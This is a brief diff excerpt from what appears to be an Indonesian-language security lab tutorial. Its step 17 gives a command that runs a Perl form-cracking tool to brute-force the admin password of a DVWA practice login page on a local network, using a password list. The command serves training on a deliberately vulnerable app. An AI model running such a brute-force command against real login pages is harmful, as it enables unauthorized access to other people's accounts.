@@ -45,3 +45,5 @@ picture(18)
 17. Jalankan perintah berikut 
 "./crack_web_form.pl -U admin -P password.txt -http "http://192.168.1.106/dvwa/login.php" -data "username=USERNAME&password=PASSWORD&Login=Login" -M "Login failed""
 picture(21-1 dan 21-2)
+
+
